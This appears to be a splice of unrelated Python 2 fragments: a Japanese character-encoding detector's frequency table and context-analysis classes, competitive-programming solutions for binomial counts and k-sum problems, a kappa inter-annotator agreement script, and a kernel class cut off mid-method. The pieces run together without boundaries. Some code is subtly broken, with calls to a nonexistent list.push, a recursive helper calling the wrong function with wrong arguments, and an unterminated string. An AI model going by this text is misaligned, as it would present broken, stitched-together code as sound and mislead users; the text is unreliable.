(0,4,0,4,0,3,0,3,0,4,4,4,3,3,3,3,3,3,4,3,4,2,4,3,4,3,3,2,4,3,4,5,4,1,4,5,3,5,4,5,3,5,4,0,3,5,5,3,1,3,3,2,2,3,0,3,4,1,3,3,2,4,3,3,3,4,0,4,0,3,0,4,5,4,4,5,3,0,4,1,0,3,4),
(0,2,0,3,0,3,0,0,0,2,2,2,1,0,1,0,0,0,3,0,3,0,3,0,1,3,1,0,3,1,3,3,3,1,3,3,3,0,1,3,1,3,4,0,0,3,1,1,0,3,2,0,0,0,0,1,3,0,1,0,0,3,3,2,0,3,0,0,0,0,0,3,4,3,4,3,3,0,3,0,0,2,3),
(2,3,0,3,0,2,0,1,0,3,3,4,3,1,3,1,1,1,3,1,4,3,4,3,3,3,0,0,3,1,5,4,3,1,4,3,2,5,5,4,4,4,4,3,3,4,4,4,0,2,1,1,3,2,0,1,2,0,0,1,0,4,1,3,3,3,0,3,0,1,0,4,4,4,5,5,3,0,2,0,0,4,4),
(0,2,0,1,0,3,1,3,0,2,3,3,3,0,3,1,0,0,3,0,3,2,3,1,3,2,1,1,0,0,4,2,1,0,2,3,1,4,3,2,0,4,4,3,1,3,1,3,0,1,0,0,1,0,0,0,1,0,0,0,0,4,1,1,1,2,0,3,0,0,0,3,4,2,4,3,2,0,1,0,0,3,3),
(0,1,0,4,0,5,0,4,0,2,4,4,2,3,3,2,3,3,5,3,3,3,4,3,4,2,3,0,4,3,3,3,4,1,4,3,2,1,5,5,3,4,5,1,3,5,4,2,0,3,3,0,1,3,0,4,2,0,1,3,1,4,3,3,3,3,0,3,0,1,0,3,4,4,4,5,5,0,3,0,1,4,5),
(0,2,0,3,0,3,0,0,0,2,3,1,3,0,4,0,1,1,3,0,3,4,3,2,3,1,0,3,3,2,3,1,3,0,2,3,0,2,1,4,1,2,2,0,0,3,3,0,0,2,0,0,0,1,0,0,0,0,2,2,0,3,2,1,3,3,0,2,0,2,0,0,3,3,1,2,4,0,3,0,2,2,3),
(2,4,0,5,0,4,0,4,0,2,4,4,4,3,4,3,3,3,1,2,4,3,4,3,4,4,5,0,3,3,3,3,2,0,4,3,1,4,3,4,1,4,4,3,3,4,4,3,1,2,3,0,4,2,0,4,1,0,3,3,0,4,3,3,3,4,0,4,0,2,0,3,5,3,4,5,2,0,3,0,0,4,5),
(0,3,0,4,0,1,0,1,0,1,3,2,2,1,3,0,3,0,2,0,2,0,3,0,2,0,0,0,1,0,1,1,0,0,3,1,0,0,0,4,0,3,1,0,2,1,3,0,0,0,0,0,0,3,0,0,0,0,0,0,0,4,2,2,3,1,0,3,0,0,0,1,4,4,4,3,0,0,4,0,0,1,4),
(1,4,1,5,0,3,0,3,0,4,5,4,4,3,5,3,3,4,4,3,4,1,3,3,3,3,2,1,4,1,5,4,3,1,4,4,3,5,4,4,3,5,4,3,3,4,4,4,0,3,3,1,2,3,0,3,1,0,3,3,0,5,4,4,4,4,4,4,3,3,5,4,4,3,3,5,4,0,3,2,0,4,4),
(0,2,0,3,0,1,0,0,0,1,3,3,3,2,4,1,3,0,3,1,3,0,2,2,1,1,0,0,2,0,4,3,1,0,4,3,0,4,4,4,1,4,3,1,1,3,3,1,0,2,0,0,1,3,0,0,0,0,2,0,0,4,3,2,4,3,5,4,3,3,3,4,3,3,4,3,3,0,2,1,0,3,3),
(0,2,0,4,0,3,0,2,0,2,5,5,3,4,4,4,4,1,4,3,3,0,4,3,4,3,1,3,3,2,4,3,0,3,4,3,0,3,4,4,2,4,4,0,4,5,3,3,2,2,1,1,1,2,0,1,5,0,3,3,2,4,3,3,3,4,0,3,0,2,0,4,4,3,5,5,0,0,3,0,2,3,3),
(0,3,0,4,0,3,0,1,0,3,4,3,3,1,3,3,3,0,3,1,3,0,4,3,3,1,1,0,3,0,3,3,0,0,4,4,0,1,5,4,3,3,5,0,3,3,4,3,0,2,0,1,1,1,0,1,3,0,1,2,1,3,3,2,3,3,0,3,0,1,0,1,3,3,4,4,1,0,1,2,2,1,3),
(0,1,0,4,0,4,0,3,0,1,3,3,3,2,3,1,1,0,3,0,3,3,4,3,2,4,2,0,1,0,4,3,2,0,4,3,0,5,3,3,2,4,4,4,3,3,3,4,0,1,3,0,0,1,0,0,1,0,0,0,0,4,2,3,3,3,0,3,0,0,0,4,4,4,5,3,2,0,3,3,0,3,5),
(0,2,0,3,0,0,0,3,0,1,3,0,2,0,0,0,1,0,3,1,1,3,3,0,0,3,0,0,3,0,2,3,1,0,3,1,0,3,3,2,0,4,2,2,0,2,0,0,0,4,0,0,0,0,0,0,0,0,0,0,0,2,1,2,0,1,0,1,0,0,0,1,3,1,2,0,0,0,1,0,0,1,4),
(0,3,0,3,0,5,0,1,0,2,4,3,1,3,3,2,1,1,5,2,1,0,5,1,2,0,0,0,3,3,2,2,3,2,4,3,0,0,3,3,1,3,3,0,2,5,3,4,0,3,3,0,1,2,0,2,2,0,3,2,0,2,2,3,3,3,0,2,0,1,0,3,4,4,2,5,4,0,3,0,0,3,5),
(0,3,0,3,0,3,0,1,0,3,3,3,3,0,3,0,2,0,2,1,1,0,2,0,1,0,0,0,2,1,0,0,1,0,3,2,0,0,3,3,1,2,3,1,0,3,3,0,0,1,0,0,0,0,0,2,0,0,0,0,0,2,3,1,2,3,0,3,0,1,0,3,2,1,0,4,3,0,1,1,0,3,3),
(0,4,0,5,0,3,0,3,0,4,5,5,4,3,5,3,4,3,5,3,3,2,5,3,4,4,4,3,4,3,4,5,5,3,4,4,3,4,4,5,4,4,4,3,4,5,5,4,2,3,4,2,3,4,0,3,3,1,4,3,2,4,3,3,5,5,0,3,0,3,0,5,5,5,5,4,4,0,4,0,1,4,4),
(0,4,0,4,0,3,0,3,0,3,5,4,4,2,3,2,5,1,3,2,5,1,4,2,3,2,3,3,4,3,3,3,3,2,5,4,1,3,3,5,3,4,4,0,4,4,3,1,1,3,1,0,2,3,0,2,3,0,3,0,0,4,3,1,3,4,0,3,0,2,0,4,4,4,3,4,5,0,4,0,0,3,4),
(0,3,0,3,0,3,1,2,0,3,4,4,3,3,3,0,2,2,4,3,3,1,3,3,3,1,1,0,3,1,4,3,2,3,4,4,2,4,4,4,3,4,4,3,2,4,4,3,1,3,3,1,3,3,0,4,1,0,2,2,1,4,3,2,3,3,5,4,3,3,5,4,4,3,3,0,4,0,3,2,2,4,4),
(0,2,0,1,0,0,0,0,0,1,2,1,3,0,0,0,0,0,2,0,1,2,1,0,0,1,0,0,0,0,3,0,0,1,0,1,1,3,1,0,0,0,1,1,0,1,1,0,0,0,0,0,2,0,0,0,0,0,0,0,0,1,1,2,2,0,3,4,0,0,0,1,1,0,0,1,0,0,0,0,0,1,1),
(0,1,0,0,0,1,0,0,0,0,4,0,4,1,4,0,3,0,4,0,3,0,4,0,3,0,3,0,4,1,5,1,4,0,0,3,0,5,0,5,2,0,1,0,0,0,2,1,4,0,1,3,0,0,3,0,0,3,1,1,4,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0),
(1,4,0,5,0,3,0,2,0,3,5,4,4,3,4,3,5,3,4,3,3,0,4,3,3,3,3,3,3,2,4,4,3,1,3,4,4,5,4,4,3,4,4,1,3,5,4,3,3,3,1,2,2,3,3,1,3,1,3,3,3,5,3,3,4,5,0,3,0,3,0,3,4,3,4,4,3,0,3,0,2,4,3),
(0,1,0,4,0,0,0,0,0,1,4,0,4,1,4,2,4,0,3,0,1,0,1,0,0,0,0,0,2,0,3,1,1,1,0,3,0,0,0,1,2,1,0,0,1,1,1,1,0,1,0,0,0,1,0,0,3,0,0,0,0,3,2,0,2,2,0,1,0,0,0,2,3,2,3,3,0,0,0,0,2,1,0),
(0,5,1,5,0,3,0,3,0,5,4,4,5,1,5,3,3,0,4,3,4,3,5,3,4,3,3,2,4,3,4,3,3,0,3,3,1,4,4,3,4,4,4,3,4,5,5,3,2,3,1,1,3,3,1,3,1,1,3,3,2,4,5,3,3,5,0,4,0,3,0,4,4,3,5,3,3,0,3,4,0,4,3),
(0,5,0,5,0,3,0,2,0,4,4,3,5,2,4,3,3,3,4,4,4,3,5,3,5,3,3,1,4,0,4,3,3,0,3,3,0,4,4,4,4,5,4,3,3,5,5,3,2,3,1,2,3,2,0,1,0,0,3,2,2,4,4,3,1,5,0,4,0,3,0,4,3,1,3,2,1,0,3,3,0,3,3),
(0,4,0,5,0,5,0,4,0,4,5,5,5,3,4,3,3,2,5,4,4,3,5,3,5,3,4,0,4,3,4,4,3,2,4,4,3,4,5,4,4,5,5,0,3,5,5,4,1,3,3,2,3,3,1,3,1,0,4,3,1,4,4,3,4,5,0,4,0,2,0,4,3,4,4,3,3,0,4,0,0,5,5),
(0,4,0,4,0,5,0,1,1,3,3,4,4,3,4,1,3,0,5,1,3,0,3,1,3,1,1,0,3,0,3,3,4,0,4,3,0,4,4,4,3,4,4,0,3,5,4,1,0,3,0,0,2,3,0,3,1,0,3,1,0,3,2,1,3,5,0,3,0,1,0,3,2,3,3,4,4,0,2,2,0,4,4),
(2,4,0,5,0,4,0,3,0,4,5,5,4,3,5,3,5,3,5,3,5,2,5,3,4,3,3,4,3,4,5,3,2,1,5,4,3,2,3,4,5,3,4,1,2,5,4,3,0,3,3,0,3,2,0,2,3,0,4,1,0,3,4,3,3,5,0,3,0,1,0,4,5,5,5,4,3,0,4,2,0,3,5),
(0,5,0,4,0,4,0,2,0,5,4,3,4,3,4,3,3,3,4,3,4,2,5,3,5,3,4,1,4,3,4,4,4,0,3,5,0,4,4,4,4,5,3,1,3,4,5,3,3,3,3,3,3,3,0,2,2,0,3,3,2,4,3,3,3,5,3,4,1,3,3,5,3,2,0,0,0,0,4,3,1,3,3),
(0,1,0,3,0,3,0,1,0,1,3,3,3,2,3,3,3,0,3,0,0,0,3,1,3,0,0,0,2,2,2,3,0,0,3,2,0,1,2,4,1,3,3,0,0,3,3,3,0,1,0,0,2,1,0,0,3,0,3,1,0,3,0,0,1,3,0,2,0,1,0,3,3,1,3,3,0,0,1,1,0,3,3),
(0,2,0,3,0,2,1,4,0,2,2,3,1,1,3,1,1,0,2,0,3,1,2,3,1,3,0,0,1,0,4,3,2,3,3,3,1,4,2,3,3,3,3,1,0,3,1,4,0,1,1,0,1,2,0,1,1,0,1,1,0,3,1,3,2,2,0,1,0,0,0,2,3,3,3,1,0,0,0,0,0,2,3),
(0,5,0,4,0,5,0,2,0,4,5,5,3,3,4,3,3,1,5,4,4,2,4,4,4,3,4,2,4,3,5,5,4,3,3,4,3,3,5,5,4,5,5,1,3,4,5,3,1,4,3,1,3,3,0,3,3,1,4,3,1,4,5,3,3,5,0,4,0,3,0,5,3,3,1,4,3,0,4,0,1,5,3),
(0,5,0,5,0,4,0,2,0,4,4,3,4,3,3,3,3,3,5,4,4,4,4,4,4,5,3,3,5,2,4,4,4,3,4,4,3,3,4,4,5,5,3,3,4,3,4,3,3,4,3,3,3,3,1,2,2,1,4,3,3,5,4,4,3,4,0,4,0,3,0,4,4,4,4,4,1,0,4,2,0,2,4),
(0,4,0,4,0,3,0,1,0,3,5,2,3,0,3,0,2,1,4,2,3,3,4,1,4,3,3,2,4,1,3,3,3,0,3,3,0,0,3,3,3,5,3,3,3,3,3,2,0,2,0,0,2,0,0,2,0,0,1,0,0,3,1,2,2,3,0,3,0,2,0,4,4,3,3,4,1,0,3,0,0,2,4),
(0,0,0,4,0,0,0,0,0,0,1,0,1,0,2,0,0,0,0,0,1,0,2,0,1,0,0,0,0,0,3,1,3,0,3,2,0,0,0,1,0,3,2,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,4,0,2,0,0,0,0,0,0,2),
(0,2,1,3,0,2,0,2,0,3,3,3,3,1,3,1,3,3,3,3,3,3,4,2,2,1,2,1,4,0,4,3,1,3,3,3,2,4,3,5,4,3,3,3,3,3,3,3,0,1,3,0,2,0,0,1,0,0,1,0,0,4,2,0,2,3,0,3,3,0,3,3,4,2,3,1,4,0,1,2,0,2,3),
(0,3,0,3,0,1,0,3,0,2,3,3,3,0,3,1,2,0,3,3,2,3,3,2,3,2,3,1,3,0,4,3,2,0,3,3,1,4,3,3,2,3,4,3,1,3,3,1,1,0,1,1,0,1,0,1,0,1,0,0,0,4,1,1,0,3,0,3,1,0,2,3,3,3,3,3,1,0,0,2,0,3,3),
(0,0,0,0,0,0,0,0,0,0,3,0,2,0,3,0,0,0,0,0,0,0,3,0,0,0,0,0,0,0,3,0,3,0,3,1,0,1,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,0,2,0,2,3,0,0,0,0,0,0,0,0,3),
(0,2,0,3,1,3,0,3,0,2,3,3,3,1,3,1,3,1,3,1,3,3,3,1,3,0,2,3,1,1,4,3,3,2,3,3,1,2,2,4,1,3,3,0,1,4,2,3,0,1,3,0,3,0,0,1,3,0,2,0,0,3,3,2,1,3,0,3,0,2,0,3,4,4,4,3,1,0,3,0,0,3,3),
(0,2,0,1,0,2,0,0,0,1,3,2,2,1,3,0,1,1,3,0,3,2,3,1,2,0,2,0,1,1,3,3,3,0,3,3,1,1,2,3,2,3,3,1,2,3,2,0,0,1,0,0,0,0,0,0,3,0,1,0,0,2,1,2,1,3,0,3,0,0,0,3,4,4,4,3,2,0,2,0,0,2,4),
(0,0,0,1,0,1,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,2,2,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,3,1,0,0,0,0,0,0,0,3),
(0,3,0,3,0,2,0,3,0,3,3,3,2,3,2,2,2,0,3,1,3,3,3,2,3,3,0,0,3,0,3,2,2,0,2,3,1,4,3,4,3,3,2,3,1,5,4,4,0,3,1,2,1,3,0,3,1,1,2,0,2,3,1,3,1,3,0,3,0,1,0,3,3,4,4,2,1,0,2,1,0,2,4),
(0,1,0,3,0,1,0,2,0,1,4,2,5,1,4,0,2,0,2,1,3,1,4,0,2,1,0,0,2,1,4,1,1,0,3,3,0,5,1,3,2,3,3,1,0,3,2,3,0,1,0,0,0,0,0,0,1,0,0,0,0,4,0,1,0,3,0,2,0,1,0,3,3,3,4,3,3,0,0,0,0,2,3),
(0,0,0,1,0,0,0,0,0,0,2,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,3,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,0,0,1,0,0,0,0,0,3),
(0,1,0,3,0,4,0,3,0,2,4,3,1,0,3,2,2,1,3,1,2,2,3,1,1,1,2,1,3,0,1,2,0,1,3,2,1,3,0,5,5,1,0,0,1,3,2,1,0,3,0,0,1,0,0,0,0,0,3,4,0,1,1,1,3,2,0,2,0,1,0,2,3,3,1,2,3,0,1,0,1,0,4),
(0,0,0,1,0,3,0,3,0,2,2,1,0,0,4,0,3,0,3,1,3,0,3,0,3,0,1,0,3,0,3,1,3,0,3,3,0,0,1,2,1,1,1,0,1,2,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,2,2,1,2,0,0,2,0,0,0,0,2,3,3,3,3,0,0,0,0,1,4),
(0,0,0,3,0,3,0,0,0,0,3,1,1,0,3,0,1,0,2,0,1,0,0,0,0,0,0,0,1,0,3,0,2,0,2,3,0,0,2,2,3,1,2,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,0,0,2,0,0,0,0,2,3),
(2,4,0,5,0,5,0,4,0,3,4,3,3,3,4,3,3,3,4,3,4,4,5,4,5,5,5,2,3,0,5,5,4,1,5,4,3,1,5,4,3,4,4,3,3,4,3,3,0,3,2,0,2,3,0,3,0,0,3,3,0,5,3,2,3,3,0,3,0,3,0,3,4,5,4,5,3,0,4,3,0,3,4),
(0,3,0,3,0,3,0,3,0,3,3,4,3,2,3,2,3,0,4,3,3,3,3,3,3,3,3,0,3,2,4,3,3,1,3,4,3,4,4,4,3,4,4,3,2,4,4,1,0,2,0,0,1,1,0,2,0,0,3,1,0,5,3,2,1,3,0,3,0,1,2,4,3,2,4,3,3,0,3,2,0,4,4),
(0,3,0,3,0,1,0,0,0,1,4,3,3,2,3,1,3,1,4,2,3,2,4,2,3,4,3,0,2,2,3,3,3,0,3,3,3,0,3,4,1,3,3,0,3,4,3,3,0,1,1,0,1,0,0,0,4,0,3,0,0,3,1,2,1,3,0,4,0,1,0,4,3,3,4,3,3,0,2,0,0,3,3),
(0,3,0,4,0,1,0,3,0,3,4,3,3,0,3,3,3,1,3,1,3,3,4,3,3,3,0,0,3,1,5,3,3,1,3,3,2,5,4,3,3,4,5,3,2,5,3,4,0,1,0,0,0,0,0,2,0,0,1,1,0,4,2,2,1,3,0,3,0,2,0,4,4,3,5,3,2,0,1,1,0,3,4),
(0,5,0,4,0,5,0,2,0,4,4,3,3,2,3,3,3,1,4,3,4,1,5,3,4,3,4,0,4,2,4,3,4,1,5,4,0,4,4,4,4,5,4,1,3,5,4,2,1,4,1,1,3,2,0,3,1,0,3,2,1,4,3,3,3,4,0,4,0,3,0,4,4,4,3,3,3,0,4,2,0,3,4),
(1,4,0,4,0,3,0,1,0,3,3,3,1,1,3,3,2,2,3,3,1,0,3,2,2,1,2,0,3,1,2,1,2,0,3,2,0,2,2,3,3,4,3,0,3,3,1,2,0,1,1,3,1,2,0,0,3,0,1,1,0,3,2,2,3,3,0,3,0,0,0,2,3,3,4,3,3,0,1,0,0,1,4),
(0,4,0,4,0,4,0,0,0,3,4,4,3,1,4,2,3,2,3,3,3,1,4,3,4,0,3,0,4,2,3,3,2,2,5,4,2,1,3,4,3,4,3,1,3,3,4,2,0,2,1,0,3,3,0,0,2,0,3,1,0,4,4,3,4,3,0,4,0,1,0,2,4,4,4,4,4,0,3,2,0,3,3),
(0,0,0,1,0,4,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,3,2,0,0,1,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,2),
(0,2,0,3,0,4,0,4,0,1,3,3,3,0,4,0,2,1,2,1,1,1,2,0,3,1,1,0,1,0,3,1,0,0,3,3,2,0,1,1,0,0,0,0,0,1,0,2,0,2,2,0,3,1,0,0,1,0,1,1,0,1,2,0,3,0,0,0,0,1,0,0,3,3,4,3,1,0,1,0,3,0,2),
(0,0,0,3,0,5,0,0,0,0,1,0,2,0,3,1,0,1,3,0,0,0,2,0,0,0,1,0,0,0,1,1,0,0,4,0,0,0,2,3,0,1,4,1,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,3,0,0,0,0,0,1,0,0,0,0,0,0,0,2,0,0,3,0,0,0,0,0,3),
(0,2,0,5,0,5,0,1,0,2,4,3,3,2,5,1,3,2,3,3,3,0,4,1,2,0,3,0,4,0,2,2,1,1,5,3,0,0,1,4,2,3,2,0,3,3,3,2,0,2,4,1,1,2,0,1,1,0,3,1,0,1,3,1,2,3,0,2,0,0,0,1,3,5,4,4,4,0,3,0,0,1,3),
(0,4,0,5,0,4,0,4,0,4,5,4,3,3,4,3,3,3,4,3,4,4,5,3,4,5,4,2,4,2,3,4,3,1,4,4,1,3,5,4,4,5,5,4,4,5,5,5,2,3,3,1,4,3,1,3,3,0,3,3,1,4,3,4,4,4,0,3,0,4,0,3,3,4,4,5,0,0,4,3,0,4,5),
(0,4,0,4,0,3,0,3,0,3,4,4,4,3,3,2,4,3,4,3,4,3,5,3,4,3,2,1,4,2,4,4,3,1,3,4,2,4,5,5,3,4,5,4,1,5,4,3,0,3,2,2,3,2,1,3,1,0,3,3,3,5,3,3,3,5,4,4,2,3,3,4,3,3,3,2,1,0,3,2,1,4,3),
(0,4,0,5,0,4,0,3,0,3,5,5,3,2,4,3,4,0,5,4,4,1,4,4,4,3,3,3,4,3,5,5,2,3,3,4,1,2,5,5,3,5,5,2,3,5,5,4,0,3,2,0,3,3,1,1,5,1,4,1,0,4,3,2,3,5,0,4,0,3,0,5,4,3,4,3,0,0,4,1,0,4,4),
(1,3,0,4,0,2,0,2,0,2,5,5,3,3,3,3,3,0,4,2,3,4,4,4,3,4,0,0,3,4,5,4,3,3,3,3,2,5,5,4,5,5,5,4,3,5,5,5,1,3,1,0,1,0,0,3,2,0,4,2,0,5,2,3,2,4,1,3,0,3,0,4,5,4,5,4,3,0,4,2,0,5,4),
(0,3,0,4,0,5,0,3,0,3,4,4,3,2,3,2,3,3,3,3,3,2,4,3,3,2,2,0,3,3,3,3,3,1,3,3,3,0,4,4,3,4,4,1,1,4,4,2,0,3,1,0,1,1,0,4,1,0,2,3,1,3,3,1,3,4,0,3,0,1,0,3,1,3,0,0,1,0,2,0,0,4,4),
(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),
(0,3,0,3,0,2,0,3,0,1,5,4,3,3,3,1,4,2,1,2,3,4,4,2,4,4,5,0,3,1,4,3,4,0,4,3,3,3,2,3,2,5,3,4,3,2,2,3,0,0,3,0,2,1,0,1,2,0,0,0,0,2,1,1,3,1,0,2,0,4,0,3,4,4,4,5,2,0,2,0,0,1,3),
(0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,1,1,0,0,1,1,0,0,0,4,2,1,1,0,1,0,3,2,0,0,3,1,1,1,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,0,1,0,0,0,2,0,0,0,1,4,0,4,2,1,0,0,0,0,0,1),
(0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,1,0,0,0,0,0,0,1,0,1,0,0,0,0,3,1,0,0,0,2,0,2,1,0,0,1,2,1,0,1,1,0,0,3,0,0,0,0,0,0,0,0,0,0,0,1,3,1,0,0,0,0,0,1,0,0,2,1,0,0,0,0,0,0,0,0,2),
(0,4,0,4,0,4,0,3,0,4,4,3,4,2,4,3,2,0,4,4,4,3,5,3,5,3,3,2,4,2,4,3,4,3,1,4,0,2,3,4,4,4,3,3,3,4,4,4,3,4,1,3,4,3,2,1,2,1,3,3,3,4,4,3,3,5,0,4,0,3,0,4,3,3,3,2,1,0,3,0,0,3,3),
(0,4,0,3,0,3,0,3,0,3,5,5,3,3,3,3,4,3,4,3,3,3,4,4,4,3,3,3,3,4,3,5,3,3,1,3,2,4,5,5,5,5,4,3,4,5,5,3,2,2,3,3,3,3,2,3,3,1,2,3,2,4,3,3,3,4,0,4,0,2,0,4,3,2,2,1,2,0,3,0,0,4,1),
)
class JapaneseContextAnalysis:
def __init__(self):
self.reset()
def reset(self):
self._mTotalRel = 0
self._mRelSample = [0] * NUM_OF_CATEGORY
self._mNeedToSkipCharNum = 0
self._mLastCharOrder = -1
self._mDone = False
def feed(self, aBuf, aLen):
if self._mDone:
return
i = self._mNeedToSkipCharNum
while i < aLen:
order, charLen = self.get_order(aBuf[i:i + 2])
i += charLen
if i > aLen:
self._mNeedToSkipCharNum = i - aLen
self._mLastCharOrder = -1
else:
if (order != -1) and (self._mLastCharOrder != -1):
self._mTotalRel += 1
if self._mTotalRel > MAX_REL_THRESHOLD:
self._mDone = True
break
self._mRelSample[jp2CharContext[self._mLastCharOrder][order]] += 1
self._mLastCharOrder = order
def got_enough_data(self):
return self._mTotalRel > ENOUGH_REL_THRESHOLD
def get_confidence(self):
if self._mTotalRel > MINIMUM_DATA_THRESHOLD:
return (self._mTotalRel - self._mRelSample[0]) / self._mTotalRel
else:
return DONT_KNOW
def get_order(self, aBuf):
return -1, 1
class SJISContextAnalysis(JapaneseContextAnalysis):
def get_order(self, aBuf):
if not aBuf:
return -1, 1
first_char = wrap_ord(aBuf[0])
if ((0x81 <= first_char <= 0x9F) or (0xE0 <= first_char <= 0xFC)):
charLen = 2
else:
charLen = 1
if len(aBuf) > 1:
second_char = wrap_ord(aBuf[1])
if (first_char == 202) and (0x9F <= second_char <= 0xF1):
return second_char - 0x9F, charLen
return -1, charLen
class EUCJPContextAnalysis(JapaneseContextAnalysis):
def get_order(self, aBuf):
if not aBuf:
return -1, 1
first_char = wrap_ord(aBuf[0])
if (first_char == 0x8E) or (0xA1 <= first_char <= 0xFE):
charLen = 2
elif first_char == 0x8F:
charLen = 3
else:
charLen = 1
if len(aBuf) > 1:
second_char = wrap_ord(aBuf[1])
if (first_char == 0xA4) and (0xA1 <= second_char <= 0xF3):
return second_char - 0xA1, charLen
return -1, charLen
MOD = 10 ** 9
class Solution(object):
def __init__(self):
self.C = [[1 for _ in xrange(2000)] for _ in xrange(2000)]
for n in xrange(1, 2000):
for k in xrange(1, n):
self.C[n][k] = self.C[n - 1][k - 1] + self.C[n - 1][k]
def solve(self, cipher):
N, K = cipher
return self.C[N + K - 1][K] % MOD
if __name__ == "__main__":
import sys
f = open("1.in", "r")
testcases = int(f.readline().strip())
solution = Solution()
for t in xrange(testcases):
N = int(f.readline().strip())
K = int(f.readline().strip())
cipher = N, K
s = "%s\n" % (solution.solve(cipher))
print s,
class Solution(object):
def kSumII(self, A, k, target):
ret = []
self.dfs(A, 0, k, [], target, ret)
return ret
def dfs(self, A, i, k, cur, remain, ret):
if len(cur) == k and remain == 0:
ret.append(list(cur))
return
if i >= len(A) or len(cur) > k or len(A)-i+len(cur) < k:
return
self.dfs(A, i+1, k, cur, remain, ret)
cur.append(A[i])
self.dfs(A, i+1, k, cur, remain-A[i], ret)
cur.pop()
def dfs_array(self, A, k, cur, remain, ret):
if len(cur) == k and remain == 0:
ret.append(list(cur))
if not A or len(cur) >= k or len(A)+len(cur) < k:
return
num = A.pop(0)
self.dfs_array(A, k, cur, remain, ret)
cur.append(num)
self.dfs_array(A, k, cur, remain-num, ret)
cur.pop()
A.push(0, num)
def dfs_stk(self, A, k, cur, remain, ret):
if len(cur) == k and remain == 0:
ret.append(list(cur))
if not A or len(cur) >= k or len(A)+len(cur) < k:
return
num = A.pop()
self.dfs(A, k, cur, remain, ret)
cur.append(num)
self.dfs(A, k, cur, remain-num, ret)
cur.pop()
A.append(num)
if __name__ == "__main__":
print Solution().kSumII([1, 2, 3, 4], 2, 5)
assert Solution().kSumII([1, 2, 3, 4], 2, 5) == [[3, 2], [1, 4]]
class Solution(object):
def kSum(self, A, k, target):
return self.dp(A, k, target)
def dp(self, A, K, target):
n = len(A)
f = [[[0 for _ in xrange(target+1)] for _ in xrange(n+1)] for _ in xrange(K+1)]
for ind, val in enumerate(A):
if val <= target:
for j in xrange(ind+1, n+1):
f[1][j][val] = 1
for i in xrange(2, K+1):
for j in xrange(i, n+1):
for v in xrange(1, target+1):
f[i][j][v] = 0
if v-A[j-1] >= 0:
f[i][j][v] += f[i-1][j-1][v-A[j-1]]
if j-1 >= i:
f[i][j][v] += f[i][j-1][v]
return f[K][n][target]
def dfs_TLE(self, A, k, target, cur, ret):
if len(cur) == k and sum(cur) == target:
ret[0] += 1
if not A or len(cur) >= k:
return
num = A.pop(0)
self.dfs_TLE(A, k, target, cur, ret)
A.push(0, num)
num = A.pop(0)
cur.append(num)
self.dfs_TLE(A, k, target, cur, ret)
cur.pop()
A.push(0, num)
def dfs_TLE_2(self, A, k, target, s, l, la, ret):
if l == k and s == target:
ret[0] += 1
if not A or l >= k or la+l < k:
return
num = A.pop(0)
self.dfs_TLE_2(A, k, target, s, l, la-1, ret)
self.dfs_TLE_2(A, k, target, s+num, l+1, la-1, ret)
A.push(0, num)
if __name__ == "__main__":
assert Solution().kSum([1, 2, 3, 4], 2, 5) == 2
assert Solution().kSum(
[1, 3, 4, 5, 8, 10, 11, 12, 14, 17, 20, 22, 24, 25, 28, 30, 31, 34, 35, 37, 38, 40, 42, 44, 45, 48, 51, 54, 56,
59, 60, 61, 63, 66], 24, 842) == 453474
import sys
import os
sys.path.append(os.path.join(os.path.dirname(__file__), ".."))
from nltk.metrics.agreement import AnnotationTask
from brat.tools import anntoconll
import io
import codecs
class KappaRater(object):
def __init__(self, S):
this_dir = os.path.dirname(os.path.realpath(__file__))
dir1 = os.path.join(this_dir, S, "G1")
dir2 = os.path.join(this_dir, S, "G2")
self.annotation_task = AnnotationTask(data=self.__readfile(dir1, dir2))
def __readfile(self, *args):
data = []
for i in xrange(len(args)):
lines = self.__get_lines(args[i])
coder = "c"+str(i+1)
for ind, line in enumerate(lines):
item, label = line
d = (coder, str(ind)+"_"+item, label)
data.append(d)
return data
def __get_lines(self, dir):
lines = []
for root, dirs, files in os.walk(dir):
for file in files:
if file.endswith(".txt"):
with io.open(os.path.join(root, file), 'r', newline='', encoding="utf-8") as f:
print f
lines += anntoconll.text_to_conll_lines(f)
f.close()
return lines
def kappa(self):
return self.annotation_task.kappa()
if __name__=="__main__":
for S in ["S2", "S3", "S4"]:
kappa_rater = KappaRater(S)
print "%s: %f"%(S, kappa_rater.kappa())
print "------------------------------
import numpy as np
class Kernel:
def __init__(self, alpha, gammas):
self.alpha = np.exp(alpha)
self.gammas = np.exp(gammas)
self.dim = gammas.size
self.nparams = self.dim + 1
def set_params(self, params):
assert params.size == self.nparams
self.alpha = np.exp(params).copy().flatten()[0]
self.gammas = np.exp(params).copy().flatten()[1:]
def get_params(self):
return np.log(np.hstack((self.alpha, self.gammas)))
def __call__(self, x1, x2):
if x1.size / len(x1) == 1:
N1 = 1
D1 = x1.size
else:
